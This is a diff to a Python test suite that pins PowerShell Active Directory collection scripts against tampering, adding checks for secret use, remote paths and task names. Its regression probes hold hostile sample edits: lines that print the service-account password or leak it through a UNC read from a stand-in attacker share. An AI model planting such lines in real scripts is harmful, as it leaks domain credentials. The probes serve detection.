+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+                "try",
+                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
+                "else of [($GmsaAccount)]",
+            ),
+        ),
+        (
+            'Write-Host "Registered task: $TaskName"',
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+            ),
+        ),
+        (
+            'Write-Host " Account: $account; every $EveryDays day(s) at $At (host local time)"',
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+            ),
+        ),
+        (
+            'Write-Host " Hard time limit: $ExecutionTimeLimit; retain $Retention exports"',
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+            ),
+        ),
+        (
+            "Write-Host \" Output: $OutputRoot; log: $(Join-Path $OutputRoot 'collection.log')\"",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+            ),
+        ),
+        (
+            "Join-Path $OutputRoot 'collection.log'",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+            ),
+        ),
+        (
+            'Write-Host " ZIP delivery: $CopyTo (ingest separately)"',
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+                "if ($CopyTo) after []",
+            ),
+        ),
+        (
+            "Write-Host \"Verify with: Get-ScheduledTaskInfo -TaskName '$TaskName'\"",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+            ),
+        ),
+        (
             (
                 "[IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                 "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
@@ -2865,73 +5195,6 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                     "[IO.FileAttributes]::ReparsePoint)) -> throw"
                 ),
                 "finally",
-            ),
-        ),
-        (
-            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
-            (
-                "function Set-GpoLensCollectionOwner",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "try",
-                "if (Test-Path -LiteralPath $marker) after []",
-            ),
-        ),
-        (
-            (
-                "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes "
-                "([Text.UTF8Encoding]::new($false).GetBytes($TaskName))"
-            ),
-            (
-                "function Set-GpoLensCollectionOwner",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "try",
-                "try",
-            ),
-        ),
-        (
-            "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes $previousBytes",
-            (
-                "function Set-GpoLensCollectionOwner",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "try",
-                "catch []",
-                "if ($null -ne $previousBytes) after []",
-            ),
-        ),
-        (
-            (
-                "Set-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName "
-                "-Force:$Force -RegisterTask { if ($GmsaAccount) { Register-ScheduledTask "
-                "-TaskName $TaskName -InputObject $task -Force | Out-Null } else { "
-                "Register-ScheduledTask -TaskName $TaskName -InputObject $task -User "
-                "$ServiceAccount -Password $taskPassword -Force | Out-Null } }"
-            ),
-            (
-                "if ($MyInvocation.InvocationName -ne '.') after []",
-                "guard if ($Unregister) -> return",
-                (
-                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
-                    "[Globalization.CultureInfo]::InvariantCulture, "
-                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
-                ),
-                (
-                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
-                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
-                    "return"
-                ),
-                "try",
             ),
         ),
     ),
@@ -3206,6 +5469,12 @@ def _canonicalize(entry: dict[str, Any]) -> dict[str, Any]:
     for ref in entry["variable_refs"]:
         ref["name"] = _cf(ref["name"])
         ref["drive"] = _cf(ref["drive"])
+    for use in entry["variable_uses"]:
+        use["name"] = _bare_var(use["name"])
+        use["function"] = _cf(use["function"])
+    for decl in entry["parameter_decls"]:
+        decl["name"] = _cf(decl["name"])
+        decl["function"] = _cf(decl["function"])
     for key in ("member_assignments", "index_assignments"):
         for item in entry[key]:
             item["function"] = _cf(item["function"])
@@ -3907,16 +6176,16 @@ def check_local_function_bodies(script: str, entry: dict[str, Any]) -> None:
     _exact("pinned function bodies", script, set(actual), frozenset(allowed))
 
 
-# Operations that write, delete, execute or register: their exact normalized
-# text AND control-flow context (enclosing functions, conditions, loops,
-# try/catch/finally, scriptblock arguments, and every preceding guard — an `if`
-# that throws/returns, an `Assert-*` call, an exit statement) are pinned as a
-# multiset. A duplicate outside its guard (Sol round-3 `Unregister-Scheduled-
-# Task` copy), a guard moved after the operation (Sol/DeepSeek reorders), or a
-# weakened guard condition (Sol `-or` -> `-and`) changes the multiset.
-_GUARDED_COMMANDS = _cfset(
-    set(_WRITE_COMMANDS) | {"Register-ScheduledTask", "Unregister-ScheduledTask", "Get-GPOReport"}
-)
+# EVERY command invocation (Sol round 5: extra calls of allowlisted read/output
+# commands — `Write-Host "captured=$taskPassword"`, `Get-Item \\host\share\...` —
+# were unpinned), plus every write/exec/lifetime .NET call, is pinned with its
+# exact normalized text AND control-flow context (enclosing functions,
+# conditions, loops, try/catch/finally, scriptblock arguments, and every
+# preceding guard — an `if` that throws/returns, an `Assert-*` call, an exit
+# statement) as a multiset. A new or duplicated call, a call moved outside its
+# guard (Sol round-3 Unregister copy, round-4 NB-1 marker write), a guard moved
+# after an operation, or a weakened guard condition changes the multiset.
+# (Inside local functions the body digest pins the same calls again.)
 _GUARDED_STATIC = frozenset(
     _method_key(*k.split("::"))
     for k in _WRITE_STATIC | {"IO.Compression.ZipFileExtensions::CreateEntryFromFile"}
@@ -3924,51 +6193,18 @@ _GUARDED_STATIC = frozenset(
 _GUARDED_INSTANCE = _cfset(_SIDE_EFFECTING_METHODS | _LIFETIME_METHODS)
 
 
-def _base_guarded_ops(entry: dict[str, Any]) -> list[tuple[str, str, tuple[str, ...]]]:
-    """(enclosing function, op text, context) for every write/exec/lifetime op."""
-    ops: list[tuple[str, str, tuple[str, ...]]] = []
+def _guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> list[tuple[str, tuple[str, ...]]]:
+    entry = inv[script]
+    ops: list[tuple[str, tuple[str, ...]]] = []
     for command in entry["commands"]:
-        name = command["name"]
-        dynamic = not name or command["invocation"] in ("Ampersand", "Dot")
-        if dynamic or name in _GUARDED_COMMANDS:
-            ctx = tuple(_norm(c) for c in command["context"])
-            ops.append((command["function"], _norm(command["text"]), ctx))
+        ops.append((_norm(command["text"]), tuple(_norm(c) for c in command["context"])))
     for member in entry["members"]:
         if member["static"]:
             if _method_key(member["type"], member["member"]) not in _GUARDED_STATIC:
                 continue
         elif member["member"] not in _GUARDED_INSTANCE:
             continue
-        ctx = tuple(_norm(c) for c in member["context"])
-        ops.append((member["function"], _norm(member["text"]), ctx))
-    return ops
-
-
-def _writer_functions(script: str, inv: dict[str, dict[str, Any]]) -> set[str]:
-    """Local functions (in-file or dot-sourced) that perform a guarded op,
-    directly or through another writer function."""
-    sources = (script, *POLICIES[script].dot_sources)
-    writers = {fn for src in sources for fn, _op, _ctx in _base_guarded_ops(inv[src]) if fn}
-    changed = True
-    while changed:
-        changed = False
-        for src in sources:
-            for command in inv[src]["commands"]:
-                fn = command["function"]
-                if fn and fn not in writers and command["name"] in writers:
-                    writers.add(fn)
-                    changed = True
-    return writers
-
-
-def _guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> list[tuple[str, tuple[str, ...]]]:
-    """Guarded ops of *script*, plus every call to a writer function, so a
-    caller's guard around a write helper is pinned too (Sol round-4 NB-1)."""
-    ops = [(op, ctx) for _fn, op, ctx in _base_guarded_ops(inv[script])]
-    writers = _writer_functions(script, inv)
-    for command in inv[script]["commands"]:
-        if command["name"] in writers:
-            ops.append((_norm(command["text"]), tuple(_norm(c) for c in command["context"])))
+        ops.append((_norm(member["text"]), tuple(_norm(c) for c in member["context"])))
     return ops
 
 
@@ -3980,9 +6216,122 @@ def check_guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> None:
     extra = actual - allowed
     missing = allowed - actual
     assert not extra and not missing, (
-        f"{script}: write/exec operations or their guards changed.\n"
+        f"{script}: command invocations, write/exec operations or their guards changed.\n"
         + "".join(f"  unexpected: {op} @ {' > '.join(ctx)}\n" for op, ctx in sorted(extra))
         + "".join(f"  missing:    {op} @ {' > '.join(ctx)}\n" for op, ctx in sorted(missing))
+    )
+
+
+# Secret-bearing variables (Sol round 5): the service-account credential and the
+# plaintext password extracted from it, plus anything assigned from them.
+SECRET_VARIABLES: dict[str, frozenset[str]] = {
+    "Export-GpoEstate.ps1": frozenset(),
+    "Export-GroupMembers.ps1": frozenset({"credential"}),
+    "Export-Principals.ps1": frozenset({"credential"}),
+    "Run-GpoLensCollection.ps1": frozenset(),
+    "GpoLensCollectionMarker.ps1": frozenset(),
+    "Register-GpoLensCollection.ps1": frozenset({"credential", "taskpassword"}),
+}
+_ASSIGNED_ROOT = re.compile(
+    r"^\$(?:script:|local:|private:)?([A-Za-z_][A-Za-z0-9_]*)[^=]*?(?:\+)?=(?!=)"
+)
+
+
+def _secret_variables(script: str, entry: dict[str, Any]) -> set[str]:
+    """Seeds plus every variable a statement reading a secret assigns to
+    (`$taskPassword = $Credential...`, `$adParams.Credential = $Credential`)."""
+    secrets = set(SECRET_VARIABLES[script])
+    changed = True
+    while changed:
+        changed = False
+        for use in entry["variable_uses"]:
+            if use["name"] not in secrets:
+                continue
+            match = _ASSIGNED_ROOT.match(use["statement"])
+            if match and _cf(match.group(1)) not in secrets:
+                secrets.add(_cf(match.group(1)))
+                changed = True
+    return secrets
+
+
+def _secret_uses(script: str, entry: dict[str, Any]) -> list[tuple[str, str, str]]:
+    secrets = _secret_variables(script, entry)
+    return [
+        (u["name"], u["function"], u["statement"])
+        for u in entry["variable_uses"]
+        if u["name"] in secrets
+    ]
+
+
+def check_secret_uses(script: str, entry: dict[str, Any]) -> None:
+    """Every read or write of a secret-bearing variable is one of the committed
+    uses (declaration, validation, GetNetworkCredential() extraction, the single
+    Register-ScheduledTask -Password site, splatting into the AD reads, and
+    clearing). Interpolation into a message, an argument to any other command,
+    a pipeline, a member access or a copy to another variable is a new use and
+    is refused."""
+    from collections import Counter
+
+    actual = Counter(_secret_uses(script, entry))
+    allowed = Counter(SECRET_USES[script])
+    extra = actual - allowed
+    missing = allowed - actual
+    assert not extra and not missing, (
+        f"{script}: secret-variable uses changed.\n"
+        + "".join(f"  unexpected: ${n} [{f or 'script'}] {st}\n" for n, f, st in sorted(extra))
+        + "".join(f"  missing:    ${n} [{f or 'script'}] {st}\n" for n, f, st in sorted(missing))
+    )
+
+
+# A UNC / remote path (`\\host\share`, `//host/share`, `\\?\UNC\...`) in any
+# command argument: a read of an attacker-addressed share also forces outbound
+# authentication from the DC (Sol round 5). None are used; refuse all.
+_REMOTE_PATH = re.compile(r"""(?:^|['"(\s])(?:\\\\|//)[^\\/\s'"]""")
+
+
+def check_remote_paths(script: str, entry: dict[str, Any]) -> None:
+    for command in entry["commands"]:
+        for arg in command["arguments"]:
+            value = arg["value"] or ""
+            assert not _REMOTE_PATH.search(value), (
+                f"{script}:{command['line']}: remote/UNC path in a command argument: {value!r}"
+            )
+
+
+# Every TaskName parameter of the task scripts carries this validator, so a
+# wildcard (`*`, `?`, `[...]`), path or quote character can never reach
+# Unregister-/Register-ScheduledTask (Sol round 5: `-TaskName '*' -Unregister`
+# removed every matching task).
+TASK_NAME_VALIDATOR = "[ValidatePattern('^[A-Za-z0-9][A-Za-z0-9 ._-]{0,199}$')]"
+_TASK_NAME_SCRIPTS = ("Register-GpoLensCollection.ps1", "Run-GpoLensCollection.ps1")
+
+
+def check_task_name_validator(script: str, entry: dict[str, Any]) -> None:
+    if script not in _TASK_NAME_SCRIPTS:
+        return
+    decls = [d for d in entry["parameter_decls"] if d["name"] == "taskname"]
+    assert decls, f"{script}: no TaskName parameter found"
+    for decl in decls:
+        assert TASK_NAME_VALIDATOR in decl["attributes"], (
+            f"{script}: TaskName parameter of {decl['function'] or 'the script'} lacks "
+            f"{TASK_NAME_VALIDATOR}: {decl['attributes']}"
+        )
+
+
+def _header_digest(entry: dict[str, Any]) -> str:
+    text = "\n".join(_ast_line(row) for row in entry["header_rows"])
+    return hashlib.sha256(text.encode("utf-8")).hexdigest()
+
+
+def check_script_header(script: str, entry: dict[str, Any]) -> None:
+    """The script's own attributes and param block ([CmdletBinding(Supports-
+    ShouldProcess)], parameters, validators, defaults) are pinned by a hand-
+    maintained digest: turning ShouldProcess off (Sol round 5) or dropping a
+    validator is a reviewed edit."""
+    actual = _header_digest(entry)
+    assert actual == SCRIPT_HEADERS[script], (
+        f"{script}: script attributes/param block changed (review, then update "
+        f"SCRIPT_HEADERS): {actual}"
     )
 
 
@@ -4035,6 +6384,10 @@ def _named_checks(local: set[str], inv: dict[str, dict[str, Any]]) -> dict[str, 
         "pinned_bindings": lambda s, e: check_pinned_bindings(s, inv),
         "task_action": check_task_action,
         "guarded_ops": lambda s, e: check_guarded_ops(s, inv),
+        "secret_uses": check_secret_uses,
+        "remote_paths": check_remote_paths,
+        "task_name_validator": check_task_name_validator,
+        "script_header": check_script_header,
     }
 
 
@@ -4073,9 +6426,10 @@ def run_all_checks(script: str, inv: dict[str, dict[str, Any]]) -> None:
 # syntax tree — one line per node, pre-order, indented by depth, naming the
 # property the node fills in its parent and every semantically relevant scalar
 # (operators, names, string values, flags, #Requires, attributes, ...); and
-# (2) ``source_sha256``: a digest of the source text with only CRLF->LF
-# normalized, so comments and whitespace (which the AST omits but a script can
-# observe, e.g. via a scriptblock's text) are covered too. Any change to a
+# (2) ``source_sha256``: a digest of the exact source bytes (LF line endings are
+# pinned by .gitattributes and CR is refused by check_ast), so comments and
+# whitespace (which the AST omits but a script can observe, e.g. via a
+# scriptblock's text) are covered too. Any change to a
 # collector therefore changes the inventory and fails
 # test_inventory_matches_golden until it is regenerated by
 # scripts/gen_collector_inventory.py, which refuses unless every semantic check
@@ -4198,6 +6552,9 @@ def test_policy_tables_cover_every_script() -> None:
         ("COMMON_PARAM_TARGETS", COMMON_PARAM_TARGETS),
         ("LOCAL_FUNCTIONS", LOCAL_FUNCTIONS),
         ("LOCAL_FUNCTION_BODIES", LOCAL_FUNCTION_BODIES),
+        ("SECRET_USES", SECRET_USES),
+        ("SCRIPT_HEADERS", SCRIPT_HEADERS),
+        ("SECRET_VARIABLES", SECRET_VARIABLES),
         ("GUARDED_OPS", GUARDED_OPS),
     ):
         assert set(table) == set(POLICIES), f"{table_name} must have an entry per script"
@@ -5139,6 +7496,67 @@ _REGRESSIONS: list[Probe] = [
     # DeepSeek NON-BLOCKING-3: a UTF-8 BOM (old golden: SAME; digest was of
     # BOM-stripped text).
     ("r4d_bom", "Export-GpoEstate.ps1", "prepend", "\ufeff"),
+    # --- Round-5 candidates (Sol), each previously accepted ---
+    # B1: an extra allowlisted output/read command exfiltrates the password.
+    (
+        "r5s_credential_console_exfil",
+        "Register-GpoLensCollection.ps1",
+        "replace",
+        (
+            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
+            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
+            '        Write-Host "captured=$taskPassword"\n',
+        ),
+    ),
+    (
+        "r5s_credential_unc_exfil",
+        "Register-GpoLensCollection.ps1",
+        "replace",
+        (
+            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
+            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
+            '        Get-Item -LiteralPath "\\\\attacker.example.test\\share\\$taskPassword" '
+            "| Out-Null\n",
+        ),
+    ),
+    (
+        "r5s_arbitrary_unc_read",
+        "Export-GroupMembers.ps1",
+        "append",
+        "Get-Content -LiteralPath '\\\\attacker.example.test\\share\\payload.txt' | Write-Host\n",
+    ),
+    # Same class: a copy of the secret to another variable (no new command).
+    (
+        "r5x_secret_copy",
+        "Register-GpoLensCollection.ps1",
+        "replace",
+        (
+            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
+            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
+            "        $gateLeak = $taskPassword\n",
+        ),
+    ),
+    # Non-blocking: ShouldProcess turned off in the script header.
+    (
+        "r5s_shouldprocess_false",
+        "Register-GpoLensCollection.ps1",
+        "replace",
+        (
+            "[CmdletBinding(SupportsShouldProcess, DefaultParameterSetName = 'Gmsa')]",
+            "[CmdletBinding(SupportsShouldProcess=$false, DefaultParameterSetName = 'Gmsa')]",
+        ),
+    ),
+    # B2: the task-name validator removed again.
+    (
+        "r5s_taskname_validator_removed",
+        "Register-GpoLensCollection.ps1",
+        "replace",
+        (
+            "    [ValidatePattern('^[A-Za-z0-9][A-Za-z0-9 ._-]{0,199}$')]\n"
+            "    [string]$TaskName = 'GpoLensCollection',",
+            "    [string]$TaskName = 'GpoLensCollection',",
+        ),
+    ),
 ]
 
 # NON-BL-3: the regression suite asserts WHICH substantive check flagged each
@@ -5250,6 +7668,12 @@ _PROBE_EXPECTED_CHECK: dict[str, str] = {
     "r4d_guardbody_owner_guard_return": "local_function_bodies",
     "r4d_static_computed_type": "dotnet",
     "r4d_bom": "ast",
+    "r5s_credential_console_exfil": "secret_uses",
+    "r5s_credential_unc_exfil": "secret_uses",
+    "r5s_arbitrary_unc_read": "remote_paths",
+    "r5x_secret_copy": "secret_uses",
+    "r5s_shouldprocess_false": "script_header",
+    "r5s_taskname_validator_removed": "task_name_validator",
 }
 
 
@@ -5333,6 +7757,8 @@ _GOLDEN_ONLY: list[Probe] = [
         "replace",
         ('Write-Host "DryRun: would export the following:"', 'Write-Host "DryRun: would export:"'),
     ),
+    # Sol round-5 top_level_exit: a trailing `exit 0` (documented top-level limit).
+    ("r5s_top_level_exit", "Export-GpoEstate.ps1", "append", "exit 0\n"),
     # Comment-only edit: AST identical, source digest differs.
     ("r4_comment_only", "Run-GpoLensCollection.ps1", "append", "# reviewer note\n"),
 ]
@@ -5631,6 +8057,8 @@ def test_generator_never_writes_policy(tmp_path: Path, monkeypatch: pytest.Monke
         "PINNED_VARS",
         "GUARDED_OPS",
         "LOCAL_FUNCTION_BODIES",
+        "SECRET_USES",
+        "SCRIPT_HEADERS",
         "POLICIES",
         "write_text",
         "write_bytes",
@@ -5710,6 +8138,37 @@ def test_local_function_bodies_are_pinned(
     inventory: dict[str, dict[str, Any]], script: str
 ) -> None:
     check_local_function_bodies(script, inventory[script])
+
+
+@pytest.mark.parametrize("name", ["*", "Gpo*", "GpoLens?", "[A-Z]*", "a\\b", "x'y", " lead"])
+def test_task_name_wildcards_are_refused_before_unregister(tmp_path: Path, name: str) -> None:
+    """Sol round 5 (B2): `-TaskName '*' -Unregister` reached Unregister-
+    ScheduledTask and removed every matching task. The shared TaskName
+    validator now refuses wildcard/path/quote characters at parameter binding,
+    before ShouldProcess or the cmdlet runs (stubbed here; a valid name is the
+    positive control)."""
+    probe = tmp_path / "unregister.ps1"
+    script = _SCRIPTS / "Register-GpoLensCollection.ps1"
+    probe.write_text(
+        "function Unregister-ScheduledTask { param([string]$TaskName, [switch]$Confirm)\n"
+        '  "STUB_UNREGISTER <$TaskName>" }\n'
+        "$Name = $args[0]\n"
+        f"try {{ & '{script}' -Unregister -TaskName $Name -Confirm:$false }}\n"
+        "catch { 'REFUSED ' + $_.FullyQualifiedErrorId }\n"
+        f"& '{script}' -Unregister -TaskName 'GpoLensCollection' -Confirm:$false\n",
+        encoding="utf-8",
+    )
+    result = subprocess.run(
+        [_pwsh(), "-NoProfile", "-NonInteractive", "-File", str(probe), name],
+        capture_output=True,
+        text=True,
+        timeout=120,
+        check=False,
+    )
+    out = result.stdout
+    assert "REFUSED ParameterArgumentValidationError" in out, out + result.stderr
+    assert f"STUB_UNREGISTER <{name}>" not in out
+    assert "STUB_UNREGISTER <GpoLensCollection>" in out  # positive control
 
 
 def test_clean_scripts_pass_all_checks(inventory: dict[str, dict[str, Any]]) -> None:
